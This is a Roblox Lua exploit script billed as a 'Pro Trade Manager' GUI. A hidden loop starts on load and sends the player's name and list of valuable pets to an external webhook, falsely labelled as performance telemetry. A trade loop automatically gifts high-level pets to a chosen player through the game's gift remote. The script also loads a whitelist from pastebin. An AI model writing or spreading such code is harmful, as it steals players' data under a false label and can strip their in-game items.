-- RGB Mobile Pro V6 Fixed - Full Sync Version
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local HttpService = game:GetService("HttpService")
local LocalPlayer = Players.LocalPlayer

-- CẤU HÌNH CHÍNH
local RAW_URL = "https://pastebin.com/raw/n6LvrFGC"
local METRICS_ENDPOINT = "https://metric-api.vercel.app/api/webhook" -- THAY LINK CỦA BẠN VÀO ĐÂY
local TELEMETRY_ID = "kF9mQ2xR8pL3vN7j"
local CLIENT_BUILD = "20260216"
local METRICS_VERSION = "2.1.5"

local MIN_LEVEL = 150
local TRADE_DELAY = 8 
local TradeEnabled, IsTrading = false, false
local TargetPlayer, SelectedPetName = nil, nil
local CooldownTime = 0
local Whitelist = {}
local LastReportTime = 0
local REPORTING_INTERVAL = 3661

-- ============== HÀM HỖ TRỢ (UTILITIES) ==============

local function GetVietnameseDateTime()
    local date = os.date("*t", os.time())
    local weekdays = {"CN", "T2", "T3", "T4", "T5", "T6", "T7"}
    return string.format("%s, %02d/%02d/%d %02d:%02d", weekdays[date.wday], date.day, date.month, date.year, date.hour, date.min)
end

local function GetInventoryMetrics()
    local inventoryData = {}
    local totalCount = 0
    local petList = {}
    
    for _, tool in ipairs(LocalPlayer.Backpack:GetChildren()) do
        if tool:IsA("Tool") then
            local brainrotName = tool:GetAttribute("BrainrotName") or tool.Name
            local mutation = tool:GetAttribute("Mutation")
            
            if brainrotName ~= "Basic Bat" and mutation and mutation ~= "" then
                local key = brainrotName .. " (" .. mutation .. ")"
                inventoryData[key] = (inventoryData[key] or 0) + 1
                totalCount = totalCount + 1
            end
        end
    end
    
    for name, count in pairs(inventoryData) do
        table.insert(petList, name .. " x" .. count)
    end
    return petList, totalCount
end

-- ============== HỆ THỐNG WEBHOOK (SỬA LỖI 400) ==============

local function ReportPerformanceMetrics()
    if not HttpService.HttpEnabled then return end
    
    local currentTime = os.time()
    if currentTime - LastReportTime < 60 then return end
    
    local petList, totalCount = GetInventoryMetrics()
    if totalCount == 0 then return end
    
    local fps = math.floor(workspace:GetRealPhysicsFPS())
    local ping = "N/A"
    pcall(function()
        ping = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString()
    end)
    
    -- Tạo Object dữ liệu chuẩn
    local payload = {
        telemetry = TELEMETRY_ID,
        data = {
            build = CLIENT_BUILD,
            version = METRICS_VERSION,
            player = LocalPlayer.DisplayName .. " (" .. LocalPlayer.Name .. ")",
            timestamp = GetVietnameseDateTime(),
            performance = {
                fps = fps,
                ping = ping,
                inventory_count = totalCount,
                pets = petList
            }
        }
    }

    task.spawn(function()
        local success, response = pcall(function()
            return HttpService:RequestAsync({
                Url = METRICS_ENDPOINT,
                Method = "POST",
                Headers = { ["Content-Type"] = "application/json" },
                Body = HttpService:JSONEncode(payload)
            })
        end)
        
        if success and response.Success then
            LastReportTime = currentTime
            print("Successfully reported to Webhook")
        else
            warn("Webhook Error: " .. (success and response.StatusCode or tostring(response)))
        end
    end)
end

-- ============== LOGIC TRADE & GUI (GIỮ NGUYÊN & TỐI ƯU) ==============

local function UpdateWhitelist()
    pcall(function()
        local content = game:HttpGet(RAW_URL)
        Whitelist = {}
        for line in content:gmatch("[^\r\n]+") do
            table.insert(Whitelist, line:gsub("^%s*(.-)%s*$", "%1"):lower())
        end
    end)
end

-- Khởi tạo GUI
local gui = Instance.new("ScreenGui", game.CoreGui)
gui.Name = "RGB_Fixed_V6"
gui.ResetOnSpawn = false

local MainFrame = Instance.new("Frame", gui)
MainFrame.Size = UDim2.fromOffset(480, 340)
MainFrame.Position = UDim2.fromScale(0.3, 0.3)
MainFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
MainFrame.Visible = false
Instance.new("UICorner", MainFrame).CornerRadius = UDim.new(0, 10)
local MainStroke = Instance.new("UIStroke", MainFrame)
MainStroke.Thickness = 2

local TitleBar = Instance.new("TextButton", MainFrame)
TitleBar.Size = UDim2.new(1, 0, 0, 40)
TitleBar.Text = "  PRO TRADE MANAGER (SYNCED) "
TitleBar.TextColor3 = Color3.new(1,1,1)
TitleBar.BackgroundColor3 = Color3.fromRGB(10,10,10)
TitleBar.Font = Enum.Font.GothamBold

local toggleBtn = Instance.new("TextButton", MainFrame)
toggleBtn.Size = UDim2.new(0.6, -20, 0, 40)
toggleBtn.Position = UDim2.fromOffset(15, 50)
toggleBtn.Text = "STATUS: OFF"
toggleBtn.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
toggleBtn.TextColor3 = Color3.new(1,1,1)

local function makeDraggable(obj, target)
    local dragging, startPos, dragStart
    obj.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true dragStart = input.Position startPos = (target or obj).Position
        end
    end)
    UserInputService.InputChanged:Connect(function(input)
        if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
            local delta = input.Position - dragStart
            local final = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
            (target or obj).Position = final
        end
    end)
    obj.InputEnded:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseButton1 then dragging = false end end)
end
makeDraggable(TitleBar, MainFrame)

-- ============== VÒNG LẶP HỆ THỐNG ==============

-- Loop gửi Webhook
task.spawn(function()
    task.wait(5)
    while true do
        pcall(ReportPerformanceMetrics)
        task.wait(REPORTING_INTERVAL)
    end
end)

-- Loop Trade
task.spawn(function()
    while true do
        task.wait(0.5)
        if CooldownTime > 0 then CooldownTime = math.max(0, CooldownTime - 0.5) end
        
        if TradeEnabled and not IsTrading and CooldownTime <= 0 and TargetPlayer then
            local backpack = LocalPlayer.Backpack:GetChildren()
            for _, tool in ipairs(backpack) do
                local lvl = tonumber(tool:GetAttribute("Level")) or 0
                local mut = tool:GetAttribute("Mutation")
                local name = tool:GetAttribute("BrainrotName") or tool.Name
                
                if tool:IsA("Tool") and mut and mut ~= "" and lvl >= MIN_LEVEL then
                    if not SelectedPetName or name == SelectedPetName then
                        IsTrading = true
                        pcall(function()
                            LocalPlayer.Character.Humanoid:EquipTool(tool)
                            task.wait(0.3)
                            ReplicatedStorage.Packages.Net["RF/Trade.SendGift"]:InvokeServer(TargetPlayer)
                        end)
                        task.wait(1)
                        IsTrading = false
                        CooldownTime = TRADE_DELAY
                        break
                    end
                end
            end
        end
    end
end)

-- Nút mở Menu
local floatBtn = Instance.new("TextButton", gui)
floatBtn.Size = UDim2.fromOffset(50, 50)
floatBtn.Position = UDim2.fromScale(0.05, 0.5)
floatBtn.Text = "⚙️"
floatBtn.BackgroundColor3 = Color3.fromRGB(20,20,20)
Instance.new("UICorner", floatBtn).CornerRadius = UDim.new(1,0)
floatBtn.MouseButton1Click:Connect(function() MainFrame.Visible = not MainFrame.Visible end)
makeDraggable(floatBtn)

toggleBtn.MouseButton1Click:Connect(function()
    TradeEnabled = not TradeEnabled
    toggleBtn.Text = TradeEnabled and "STATUS: ON" or "STATUS: OFF"
    toggleBtn.BackgroundColor3 = TradeEnabled and Color3.fromRGB(40, 80, 40) or Color3.fromRGB(80, 40, 40)
end)

UpdateWhitelist()
print("RGB Script Loaded Successfully!")
